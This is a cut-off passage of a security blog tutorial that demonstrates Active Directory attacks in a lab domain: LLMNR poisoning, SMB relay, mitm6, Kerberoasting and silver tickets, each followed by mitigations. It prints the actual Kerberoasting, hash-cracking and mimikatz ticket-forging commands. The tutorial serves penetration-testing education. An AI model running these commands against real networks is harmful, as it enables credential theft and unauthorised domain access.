<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Active Directory Attacks" /><meta name="author" content="Muhammad Adel" /><meta property="og:locale" content="en_US" /><meta name="description" content="LLMNR Poisoning" /><meta property="og:description" content="LLMNR Poisoning" /><link rel="canonical" href="https://itsfading.github.io/posts/Active-Directory-Attacks/" /><meta property="og:url" content="https://itsfading.github.io/posts/Active-Directory-Attacks/" /><meta property="og:site_name" content="Muhammad Adel" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-06-25T18:45:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Active Directory Attacks" /><meta name="twitter:site" content="@ItsFadinG_" /><meta name="twitter:creator" content="@Muhammad Adel" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Muhammad Adel"},"dateModified":"2025-04-07T14:02:05+02:00","datePublished":"2021-06-25T18:45:00+02:00","description":"LLMNR Poisoning","headline":"Active Directory Attacks","mainEntityOfPage":{"@type":"WebPage","@id":"https://itsfading.github.io/posts/Active-Directory-Attacks/"},"url":"https://itsfading.github.io/posts/Active-Directory-Attacks/"}</script><title>Active Directory Attacks | Muhammad Adel</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Muhammad Adel"><meta name="application-name" content="Muhammad Adel"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/Mine.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Muhammad Adel</a></div><div class="site-subtitle font-italic">CyberSecurity geek, who wants to share his day-to-day knowledge</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://twitter.com/ItsFadinG_" aria-label="twitter" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/muhammadadel14" aria-label="linkedin" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/ItsFadinG" aria-label="github" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['Muhammad.adel.tr','gmail.com'].join('@')" aria-label="email" class="order-6" > <i class="fas fa-envelope"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Active Directory Attacks</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Active Directory Attacks</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Muhammad Adel </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Jun 25, 2021, 6:45 PM +0200" prep="on" > Jun 25, 2021 <i class="unloaded">2021-06-25T18:45:00+02:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Apr 7, 2025, 2:02 PM +0200" prefix="Updated " > Apr 7 <i class="unloaded">2025-04-07T14:02:05+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3315 words">18 min</span></div></div><div class="post-content"><h2 id="llmnr-poisoning"><strong>LLMNR Poisoning</strong></h2><p>It stands for Link-Local Multicast Name Resolution. it acts as a host discovery/identification method in windows systems. LLMNR and NBT-NS (NetBios Name System)are used as an alternative for Domain Name System (DNS) and can identify other hosts in same local link or network.</p><p><strong>Demonstration</strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGTs25gpwwGfF6_pibO%2F-MGTzH4bB3g4gm9XMtQi%2Fllmnr.png?alt=media&amp;token=5e7d8239-cf0d-4769-84de-9963c7ef38df" alt="LLMNR Poisoning" /></p><p>So let’s stimulate this.</p><p>First run Responder with the following parameters.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGTs25gpwwGfF6_pibO%2F-MGTzjgq_Zx-h6iJKG5F%2Fres1.png?alt=media&amp;token=87c2fa1e-f31e-4e81-b635-477867e87c7d" alt="Responder" /></p><p>Then go to your windows client machine and stimulate that you are the victim and make a connection to your attacking machine which is undefined in their DNS.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGTs25gpwwGfF6_pibO%2F-MGU-DIAUP4vyO37e-lz%2Fres2.png?alt=media&amp;token=dfad225d-46c7-434d-9624-78e0bd34a81c" alt="Send the hash to the attacker" /></p><p>then back to listener (Responder) and you will see the hash of the victim machine.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGTs25gpwwGfF6_pibO%2F-MGU-aFYDXKx1XIhes8y%2Fres3.png?alt=media&amp;token=ef4daebe-8193-4885-91f0-8ca7eda16537" alt="Victim's Hash" /></p><h3 id="mitigation"><strong>Mitigation</strong></h3><p><strong>1.</strong> Disable LLMNR and NBT-NS.</p><p><strong>2.</strong> Install a Network access control.</p><h2 id="smb-relay"><strong>SMB Relay</strong></h2><p>Instead of cracking hashes gathered with responder, we can relay those hashes to specific machine and gain access.</p><p>for more info check this link</p><p><a href="https://www.sans.org/blog/smb-relay-demystified-and-ntlmv2-pwnage-with-python/">SANS Penetration Testing blog pertaining to SMB Relay Demystified and NTLMv2 Pwnage with Python</a></p><p>Also to demonstrate what happens behind the scene take a look at those.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ-A4iRsSuu7skv_P_%2Fsans1.png?alt=media&amp;token=73bba686-1b68-4aae-be85-d2cdd2262e13" alt="SANS: smb auth in normal mode" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ-HFpGauFKYhoPbxR%2Fsans2.png?alt=media&amp;token=55ef2253-5504-49f9-a8b0-cbdbf011f6ba" alt="SANS: SMB AUTH in attacking mode" /></p><p><strong>Attack requirements</strong></p><p><strong>1.</strong> SMB signing must be disabled on the target.</p><p><strong>2.</strong> Relayed user must be Admin on the targeted machine.</p><p><strong>Discovering Hosts with SMB Signing Disabled</strong></p><p>we will use nmap for this phase.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ2DYscj-wuSAEuK7b%2Fsmb1.png?alt=media&amp;token=9aa4e53e-c622-477b-a2cf-b81461f72488" alt="SMB Signing Disabled" /></p><p>Now, we know that our target’s smb signing is disabled so let’s start our attack.</p><p>First, Edit our <em>Responder.conf</em> and disable SMB and HTTP server.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ2b7vtrnxjCGxdWQ6%2Fsmr4.png?alt=media&amp;token=dae12429-2c22-4037-8668-9e7dd414700e" alt="" /></p><p>Then let’s fire up Responder.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ3Ar-BQXnbU2FF1i4%2Fsbmr5.png?alt=media&amp;token=d4dd62e1-99fd-4608-ace4-f93347f44be6" alt="" /></p><p>Then, Fire up our relay using ntlmrelayx.py.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ2xpfkidIYc2pbokG%2Fsmbr6.png?alt=media&amp;token=f5da87c0-fb74-448b-a6b5-12019d80638e" alt="" /></p><p>Then let’s fake the connections from the victim machine.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ3Jq-vGKMIxRvyn34%2Fsmb7.png?alt=media&amp;token=08222d29-157c-4750-9c0e-ce26586053d5" alt="" /></p><p>Back to our relay, we have got an NTLM hashes from the SAM file.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ3eMt6RS8TrIy-mnw%2Fsmbr8.png?alt=media&amp;token=89eb6577-299e-497a-8157-593b5022414c" alt="Reading the SAM file" /></p><p><strong>Getting an smb shell via smb relay</strong></p><p>the same method we have did before but we are going to add -i option to our relay.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ46gmVVT3DOfnijzb%2Fsmbshell1.png?alt=media&amp;token=cae26b0f-8c80-4bb2-b9f0-861a68475663" alt="" /></p><p>Again let’s fake the connection from the victim machine.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ4MU977kPivcWzMp8%2Fsmbshell2.png?alt=media&amp;token=691af024-cdcd-453e-9ad9-e33b7585931c" alt="Got smb shell" /></p><p>Now our relay have established an smb shell to us on port 11000, So let’s connect to it through netcat.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MGYRYYc39hCJ13kKNfF%2F-MGZ420ArNQ9WQ56uMem%2Fsmbaccess.png?alt=media&amp;token=c273d367-2b64-4580-9db9-dcb2d183dee4" alt="" /></p><p><strong>Mitigation</strong></p><p><strong>1.</strong> Enable smb signing on all devices.</p><p><strong>2.</strong> Disable NTLM authentication on the network.</p><p><strong>3.</strong> Account tiering: which to limit the domain administrators to only login to their domain accounts.</p><p><strong>4.</strong> Local Admin restrictions</p><p>‌</p><h2 id="ipv6-attacks"><strong>IPV6 Attacks</strong></h2><p><strong>Primary DNS takeover via mitm6</strong></p><p>mitm6 starts with listening on the primary interface of the attacker machine for Windows clients requesting an IPv6 configuration via DHCPv6. mitm6 will reply to those DHCPv6 requests, assigning the victim an IPv6 address within the link-local range.</p><p><strong>Demonstration</strong></p><p>First, let’s set up Mitm6 and the relay.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MMAuubtIy2cAbBneLQr%2F-MMAvLEFGZtywZd0ad1_%2FIPV6%20Attack%202%20.png?alt=media&amp;token=c1ffd74a-ff30-42b9-9d0b-b7c9f55bb2f6" alt="MITM6" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MMAuubtIy2cAbBneLQr%2F-MMAvFv7BiyNg23no4PM%2FIPV6%20Attack.png?alt=media&amp;token=3f36700a-5b93-4246-992c-9669fd27d1df" alt="Relay" /></p><p>Then, let’s simulate the attack by restarting our victim machine. then we will find that the machine has been assigned an IPV6 address. So any connection with IPV6 will come back to us on the relay which will dump many information by this way.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MMAuubtIy2cAbBneLQr%2F-MMAvxBSBjku428XUW1q%2FIPV6%20Attack%203.png?alt=media&amp;token=02bfabe4-a86f-478e-bb7a-850f1e9f45ef" alt="" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MMAuubtIy2cAbBneLQr%2F-MMAw0i6w1J3gC_-04nr%2FIPV6%20Attack%204%20.png?alt=media&amp;token=766b3dac-4746-4980-ad51-456855164ddf" alt="" /></p><p><strong>Mitigation</strong></p><p><strong>1.</strong> Disable IPv6.</p><p><strong>2.</strong> Disable WPAD if it not in use.</p><p><strong>3.</strong> Enable LDAP signing and LDAP channel binding.</p><h2 id="kerberos-attacks"><strong>Kerberos Attacks</strong></h2><h3 id="kerbroasting"><strong>Kerbroasting</strong></h3><p>If you got a valid domain user, you may just ask the KDC to issue you a valid TGS for any service. Knowing the fact that SPN attributes can be set to a specific username, and that the TGS is encrypted using service’s key (user’s key in that case) We can issue a TGS ticket on our own machine, dump the ticket and start an offline brute force attack against it to retrieve the plain text password for that user (service account)! that is called Kerbroasting.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>root@kali: GetUserSPNs.py marvel.local/fcastle:Password1 <span class="nt">-dc-ip</span> 192.168.219.131 <span class="nt">-request</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MMGu8pD-XD5iMQICG12%2F-MMGv-KTe0aJT3rkSJfP%2FKerberoasting%201.png?alt=media&amp;token=693eeed7-7d29-4acc-b65a-b89fff801ecd" alt="Request a TGS" /></p><p>Then after that we can crack the ticket offline and retrieving the password of the service.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>root@kali: hashcat <span class="nt">--help</span> |  <span class="nb">grep</span>  <span class="s2">"TGS"</span>

 13100 | Kerberos 5, etype 23, TGS-REP | Network Protocols
 19600 | Kerberos 5, etype 17, TGS-REP | Network Protocols
 19700 | Kerberos 5, etype 18, TGS-REP | Network Protocols
root@kali: hashcat <span class="nt">-m</span> 13100 TGS_Ticket.txt
</pre></table></code></div></div><p><strong>Anther way</strong></p><p>We can call the KerberosRequestorSecurityToken constructor by specifying the SPN with the - ArgumentList option as shown in Listing. <code class="language-plaintext highlighter-rouge">Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SQLSERVICE/Marvel.local'</code></p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="n">PS</span> <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">offsec</span><span class="p">.</span><span class="n">CORP</span><span class="o">&gt;</span> <span class="n">klist</span>
<span class="n">Current</span> <span class="n">LogonId</span> <span class="n">is</span> <span class="mi">0</span><span class="o">:</span><span class="mh">0x3dedf</span>
<span class="n">Cached</span> <span class="n">Tickets</span><span class="o">:</span>  <span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="cp">#1&gt; Client: fcastle @ Mrvel.local
</span><span class="n">Server</span><span class="o">:</span> <span class="n">SQLSERVICE</span><span class="o">/</span><span class="n">Marvel</span><span class="p">.</span><span class="n">local</span> <span class="err">@</span> <span class="n">Marvel</span><span class="p">.</span><span class="n">local</span>
<span class="n">KerbTicket</span> <span class="n">Encryption</span> <span class="n">Type</span><span class="o">:</span> <span class="n">RSADSI</span> <span class="n">RC4</span><span class="o">-</span><span class="n">HMAC</span><span class="p">(</span><span class="n">NT</span><span class="p">)</span>
<span class="n">Ticket</span> <span class="n">Flags</span> <span class="mh">0x40a50000</span>  <span class="o">-&gt;</span> <span class="n">forwardable</span> <span class="n">renewable</span> <span class="n">pre_authent</span> <span class="n">ok_as_delegate</span> <span class="n">name_c</span>
<span class="n">ano</span>
<span class="n">Start</span> <span class="n">Time</span><span class="o">:</span>  <span class="mi">2</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">10</span><span class="o">:</span><span class="mi">18</span><span class="o">:</span><span class="mi">31</span>  <span class="p">(</span><span class="n">local</span><span class="p">)</span>
<span class="n">End</span> <span class="n">Time</span><span class="o">:</span>  <span class="mi">2</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">20</span><span class="o">:</span><span class="mi">17</span><span class="o">:</span><span class="mi">53</span>  <span class="p">(</span><span class="n">local</span><span class="p">)</span>
<span class="n">Renew</span> <span class="n">Time</span><span class="o">:</span>  <span class="mi">2</span><span class="o">/</span><span class="mi">19</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">10</span><span class="o">:</span><span class="mi">17</span><span class="o">:</span><span class="mi">53</span>  <span class="p">(</span><span class="n">local</span><span class="p">)</span>
<span class="n">Session</span> <span class="n">Key</span> <span class="n">Type</span><span class="o">:</span> <span class="n">RSADSI</span> <span class="n">RC4</span><span class="o">-</span><span class="n">HMAC</span><span class="p">(</span><span class="n">NT</span><span class="p">)</span>
<span class="n">Cache</span> <span class="n">Flags</span><span class="o">:</span>  <span class="mi">0</span>
<span class="n">Kdc</span> <span class="n">Called</span><span class="o">:</span> <span class="n">PDC</span><span class="p">.</span><span class="n">Marvel</span><span class="p">.</span><span class="n">local</span>
<span class="n">PS</span> <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">offsec</span><span class="p">.</span><span class="n">CORP</span><span class="o">&gt;</span> <span class="n">klist</span> <span class="o">/</span><span class="n">export</span>
</pre></table></code></div></div><p>If we are able to request the ticket and decrypt it using brute force or guessing (in a technique known as <strong>Kerberoasting</strong>), we will know the password hash, and from that we can crack the clear text password of the service account. As an added bonus, we do not need administrative privileges for this attack.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>kali@kali:~<span class="nv">$ </span>python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Fcastle@SQLSERVICE~Marvel.local.kirbi

found password <span class="k">for </span>ticket 0: MYpassword123 File: 1-40a50000-Fcastle@SQLSERVICE~Marvel.local.kirbi
All tickets cracked!
</pre></table></code></div></div><h3 id="silver-tickets"><strong>Silver Tickets</strong></h3><p>Since we have divided the kerberos Authentication into two parts. the first one is AS-REQ, AS-REP and TGS-REQ, TGS-REP. The 2nd part is client - service which is the more interesting part for the silver ticket. To authenticate to the service, the client sends a copy of the <strong>TGS Ticket (Service Ticket)</strong> which is encrypted using the service Secret key and the User Authenticator message which is encrypted using the Service Session Key. So the actual service authentication part 2, and all it’s needed is the service secret key. if you have a service secret key, you may just create a random session key, add it to your own Service ticket, encrypt it with the service’s secret, and send it to the service while authenticating. As all the service will do is just trying to decrypt that ticket with its own key, which will work because it’s the same key you used while encrypting the ticket, then use the session key (which you generated) to decrypt the Authenticator Message.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MLleHggLGDNZw31DXUz%2F-MLmYiQ3MvFE4GNjUH2m%2F9%20-%20From%20User%20to%20Serivce.png?alt=media&amp;token=c246217c-d3b4-454f-8505-4aaad3e678a5" alt="2nd part Client &lt;-&gt; Service" /></p><p>Before we launch the attack we need to target a specific <strong>service</strong> and grab its <strong>password</strong> and its <strong>NTLM</strong> hash. we can achieve this by targeting any service account and launch a kerberos attack on it to crack its password. So now let’s assume we have all of these and we ready to create a silver ticket.</p><p>First, open mimkatz and run the following command:</p><p><code class="language-plaintext highlighter-rouge">kerberos::golden /user:administrator /domain:jnkfo.lab /sid:S-1-5-21-3178339118-3033626349-2532976716 /target:win10.jnkfo.lab /rc4:1ad9c160bd7ab9cb4b7c890c96862305 /service:cifs</code></p><p>‌</p><ul><li><p>user: Username, this can be any user, even invalid one will work.</p><li><p>domain: The domain name</p><li><p>sid: Domain sid, can be obtained via many methods, whoami /user is one.</p><li><p>target: Target machine</p><li><p>rc4: NTLM hash of the target service</p><li><p>Service: The service name, cifs as am accessing file sharing service</p></ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MM5L2otAhLKk5Al_W5g%2F-MM5x0uBcljzME7V1x8m%2FSilver%20tICKET%202.png?alt=media&amp;token=eda2081b-8bb2-4079-97a4-a32a415c1e70" alt="Silver Ticket" /></p><p>Now, we have got a Silver ticket to access file share on the win10.jnkfo.lab machine.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MM5L2otAhLKk5Al_W5g%2F-MM5xgD5XBm-ZuG6UWU_%2FSilver%20tICKET%203.png?alt=media&amp;token=b7eb8bf2-b14c-4184-a3a3-884fcea8e644" alt="" /></p><h3 id="golden-tickets">Golden Tickets</h3><p>Golden ticket attack takes part in (TGS-REQ). The TGT is encrypted using the 